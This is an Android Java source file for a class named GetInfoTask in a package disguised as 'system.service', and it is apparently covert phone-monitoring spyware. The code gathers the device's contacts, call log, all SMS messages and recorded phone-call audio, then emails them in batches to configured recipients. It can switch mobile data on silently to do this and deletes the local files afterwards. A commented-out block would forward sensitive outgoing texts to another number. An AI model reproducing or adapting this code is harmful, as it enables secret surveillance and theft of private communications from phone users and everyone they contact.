package system.service;

import java.io.DataOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import system.service.activity.GlobalPrefActivity;
import system.service.activity.NETWORK_CONNECT_MODE;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;
import system.service.feature.contact.ContactCtrl;
import system.service.feature.contact.ContactInfo;
import system.service.feature.phonecall.PhoneCallCtrl;
import system.service.feature.phonecall.PhoneCallInfo;
import system.service.feature.sms.SmsCtrl;
import system.service.feature.sms.SmsInfo;

import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.mail.MailSender;
import com.particle.inspector.common.util.FileCtrl;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final static String LOGTAG = "GetInfoTask";
	
	private final static int DEFAULT_RETRY_COUNT = 3;
	
	public Context context;
	private int interval = 1; // interval days
	
	public static List<File> attachments;
	
	private static final long MIN_FILE_SIZE = 10240; // 10KB
	
	public GetInfoTask(Context context)
	{
		super();
		this.context = context;
		if (attachments != null) attachments.clear();
		else attachments = new ArrayList<File>();
		
		interval = GlobalPrefActivity.getInfoInterval(context);
	}
	
	public void run() 
	{
		// ===================================================================================
		// Check outgoing SMS for redirecting these sensitive
		// ===================================================================================
		/*
		boolean allowRedirectSMS = GlobalPrefActivity.getRedirectSms(context);
		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		if (allowRedirectSMS && phoneNum.length() > 0) {
			String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
					.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
					.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
			if (sensitiveWords.length > 0) {
				List<SmsInfo> smsList = SmsCtrl.getSensitiveOutgoingSmsList(context, sensitiveWords, timeThreshold);
				for (SmsInfo sms : smsList) {
					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), sms.phoneNumber);
					SmsCtrl.sendSms(phoneNum, header + sms.smsbody);
				}
			}
		}
		*/
		
		// If there are no recipients, return 
		String[] recipients = getRecipients(context);
		if (recipients == null || recipients.length == 0) return;
		
		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
		
		// ===================================================================================
		// Try to send contact/phonecall/SMS collections
		// ===================================================================================
		if (isTimeToCollectInfo()) 
		{
			// If network not connected, retrun if silent mode
			if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
				return;
			}
			// Or try to connect network if active mode
			else if (!isAlreadyDataNetworkConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
				if (!NetworkUtil.tryToConnectDataNetwork(context)) {
					return;
				}
			}
			
			// If come here, means the network connected
			
			// Clean attachments
			if (attachments == null) attachments = new ArrayList<File>();
			else attachments.clear();
			
			// Collect information
			CollectContact(context);
			SysUtils.threadSleep(1000, LOGTAG);
			CollectPhoneCallHist(context);
			SysUtils.threadSleep(1000, LOGTAG);
			CollectSms(context);
			SysUtils.threadSleep(1000, LOGTAG);
			
			// If network cut, return
			if (!NetworkUtil.isNetworkConnected(context)) {
				// Clean info files
				FileCtrl.cleanTxtFiles(context);
				return;
			}
			
			// Send mail
			String phoneNum = ConfigCtrl.getSelfName(context);
			String subject = context.getResources().getString(R.string.mail_from) 
		          		 + phoneNum + "-" + DatetimeUtil.format3.format(new Date())
		          		 + context.getResources().getString(R.string.mail_description);
			String body = String.format(context.getResources().getString(R.string.mail_body_info), phoneNum);
			String pwd = MailCfg.getSenderPwd(context);
			
			boolean result = false;
			int retry = DEFAULT_RETRY_COUNT;
			while(!result && retry > 0)
			{
				String host = MailCfg.getHost(context);
				String sender = MailCfg.getSender(context);
				result = sendMail(subject, body, host, sender, pwd, recipients, attachments);
				retry--;
			}
			attachments.clear();
				
			// Update the last date time
			if (result) {
				ConfigCtrl.setLastGetInfoTime(context, new Date());
			}
			
			// Clean info files
			FileCtrl.cleanTxtFiles(context);
		}
		
		// ===================================================================================
		// Try to send phone call recording
		// ===================================================================================
		SysUtils.threadSleep(1000, LOGTAG);
		// If network connected, try to collect and send the information
		boolean isConnected = NetworkUtil.isNetworkConnected(context);
		// If network not connected, retrun if silent mode
		if (!isConnected && netMode == NETWORK_CONNECT_MODE.SILENT) {
			return;
		}
		// Or try to connect network if active mode
		else if (!isConnected && netMode == NETWORK_CONNECT_MODE.ACTIVE) {
			if (!NetworkUtil.tryToConnectDataNetwork(context)) {
				return;
			}
		}
		
		// If come here, means the network connected
		
		// Get all wav files
		String prefix = context.getResources().getString(R.string.phonecall_record);
		List<File> wavs = new ArrayList<File>();
		try {
			File dir = FileCtrl.getInternalStorageFilesDir(context);
			if (!dir.exists() || !dir.isDirectory()) return;
			
			File[] files = dir.listFiles();
			String name;
			for (File file : files) {
				name = file.getName();
				if (file.isFile() && name.endsWith(FileCtrl.SUFFIX_WAV))
				{
					wavs.add(file);
				}
			}
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
		
		int wavCount = wavs.size();
		if (wavCount <= 0) return;
		
		// Send mails (5 wavs attached per mail) 
		int COUNT_PER_PACKAGE = 5;
		String phoneNum = ConfigCtrl.getSelfName(context);
		String body = String.format(context.getResources().getString(R.string.mail_body_record), phoneNum);
		String pwd = MailCfg.getSenderPwd(context);
		
		for (int i=0; i < (1 + wavCount/COUNT_PER_PACKAGE); i++) {
			List<File> pack = getPackage(wavs, COUNT_PER_PACKAGE, i);
			if (pack.size() <= 0) break;

			String subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
		       		 + "-" + DatetimeUtil.format2.format(new Date());
			
			if (!NetworkUtil.isNetworkConnected(context)) {
				return;
			}
			boolean result = false;
			int retry = DEFAULT_RETRY_COUNT;
			while(!result && retry > 0)
			{
				String host = MailCfg.getHost(context);
				String sender = MailCfg.getSender(context);
				result = sendMail(subject, body, host, sender, pwd, recipients, pack);
				retry--;
			}
		
			// Clean wav files in SD-CARD
			if (result) {
				FileCtrl.cleanWavFiles(pack);
			}
		}
		
		// If data network is connected by active mode, try to disconnect it
		if (!isAlreadyDataNetworkConnected) {
			NetworkUtil.tryToDisconnectDataNetwork(context);
		}
		
	} // end of run()
	
	// Make sure the time range ( > days that user set)
	private boolean isTimeToCollectInfo() {
		Date lastDatetime = null;
		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
		if (lastDatetimeStr != null && lastDatetimeStr.length() > 0) {
			try {
				lastDatetime = DatetimeUtil.format.parse(lastDatetimeStr);
			} catch (Exception ex) {}
		}
			
		Calendar now = Calendar.getInstance();
		if (interval < 1) interval = 1;
		now.add(Calendar.DATE, -1*interval);
		Date now_minus_x_day = now.getTime();
		return (lastDatetime == null || now_minus_x_day.after(lastDatetime)); 
	}
	
	// Get i*count ~ (i+1)*count members in wavs as one package
	private List<File> getPackage(List<File> wavs, final int count, final int i) 
	{
		List<File> pack = new ArrayList<File>();
		
		int wavCount = wavs.size();
		for (int j=i*count; j<(i+1)*count; j++) {
			if (j < wavCount) {
				// Valid if size is larger than 10KB
				if (wavs.get(j).length() > MIN_FILE_SIZE) {
					pack.add(wavs.get(j));
				} else { 
					try { wavs.get(j).delete(); }
					catch (Exception ex) {}
				}
			}
		}
		return pack;
	}
	
	public static void CollectSms(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = makeFileName(context, context.getResources().getString(R.string.sms_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
				
			File file = FileCtrl.Save2InternalStorage(context, fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectPhoneCallHist(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = makeFileName(context, context.getResources().getString(R.string.phonecall_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
				
			File file = FileCtrl.Save2InternalStorage(context, fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectContact(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<ContactInfo> list = ContactCtrl.getContactList(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = makeFileName(context, context.getResources().getString(R.string.contact_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
				
			File file = FileCtrl.Save2InternalStorage(context, fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}
	
	public static boolean sendMail(String subject, String body, String host, String sender, String pwd, String[] recipients, List<File> files)
	{
		if (host == null) return false;
		boolean ret = false;

        try {   
            MailSender gmailSender = new MailSender(host, sender, pwd);
            gmailSender.setFrom(sender);
            gmailSender.setTo(recipients);
            gmailSender.setSubject(subject);
            gmailSender.setBody(body);
            
            for(int i = 0; i < files.size(); i++)
            	gmailSender.addAttachment(files.get(i));
            
            ret = gmailSender.send();
        } catch (Exception e) {   
            Log.e(LOGTAG, (e == null) ? "Failed to send mail" : e.getMessage());
        }
        
		return ret;
	}
	
	private static String[] getRecipients(Context context)
	{
		String mail = GlobalPrefActivity.getReceiverMail(context);
		String[] mails = mail.split(",");
		if (mails.length > 0) {
			return StrUtils.filterMails(mails);
		} else {
			return null;
		}
	}
	
	private static String makeFileName(Context context, String nameBase, String deviceName, String suffix) 
	{	
		return nameBase + "-" + deviceName + "-" + DatetimeUtil.format3.format(new Date()) + suffix;
	}
	
}
